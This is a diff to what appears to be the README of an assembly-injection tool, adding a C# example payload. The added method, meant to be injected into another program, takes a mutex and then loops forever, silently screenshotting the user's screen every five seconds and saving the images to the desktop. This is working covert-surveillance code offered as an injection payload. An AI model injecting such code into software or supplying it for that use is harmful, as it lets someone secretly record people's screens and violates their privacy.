@@ -41,6 +41,33 @@ public static void NewMethod()
 }
 ```
 
+Example of a method that takes a screenshot every 5 seconds and saves it to disk:
+
+```csharp
+public static void NewMethod() {
+    System.Threading.Mutex mutex = new System.Threading.Mutex(false, "INJ_ASSEMBLY__#");
+    if (!mutex.WaitOne(System.TimeSpan.FromSeconds(3), false)) {
+        return;
+    } else {
+        int count = 0;
+        while (true) {
+            try {
+                System.Drawing.Rectangle captureRectangle = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
+                System.Drawing.Bitmap captureBitmap = new System.Drawing.Bitmap(captureRectangle.Width, captureRectangle.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+
+                System.Drawing.Graphics captureGraphics = System.Drawing.Graphics.FromImage(captureBitmap);
+
+                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+                captureBitmap.Save($"C:\\Users\\ADMIN\\Desktop\\screenshot-{count}.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+            } catch {}
+
+            System.Threading.Thread.Sleep(5000);
+            count++;
+        }
+    }
+}
+```
+
 It's possible to copy the arguments of the method we inject the call into and pass them to our own. Note that is is not possible with arguments tho, manual tinkering needed.
 
 ## Todo
